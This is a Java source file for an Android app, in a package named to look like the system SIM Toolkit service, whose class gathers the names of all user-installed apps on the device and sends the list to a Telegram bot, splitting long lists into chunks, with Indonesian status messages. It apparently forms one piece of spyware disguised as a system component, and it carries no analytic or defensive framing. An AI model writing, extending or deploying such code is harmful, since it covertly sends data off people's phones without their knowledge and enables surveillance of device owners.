package com.android.stk.service;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.util.List;

public class AppListHelper {

    public static void sendInstalledApps(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

            StringBuilder list = new StringBuilder("📦 Aplikasi Terinstal (User):\n");

            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = pm.getApplicationLabel(app).toString();
                    list.append("• ").append(appName).append("\n");
                }
            }

            String result = list.toString().trim();

            if (result.length() < 10 || result.equals("📦 Aplikasi Terinstal (User):")) {
                TelegramSender.sendText("📭 Tidak ada aplikasi user yang terdeteksi.");
            } else if (result.length() > 4000) {
                // Jika terlalu panjang, potong jadi beberapa bagian
                int chunkSize = 3800;
                for (int i = 0; i < result.length(); i += chunkSize) {
                    int end = Math.min(result.length(), i + chunkSize);
                    TelegramSender.sendText(result.substring(i, end));
                }
            } else {
                TelegramSender.sendText(result);
            }

        } catch (Exception e) {
            TelegramSender.sendText("❌ Gagal mengambil daftar aplikasi.");
        }
    }
}
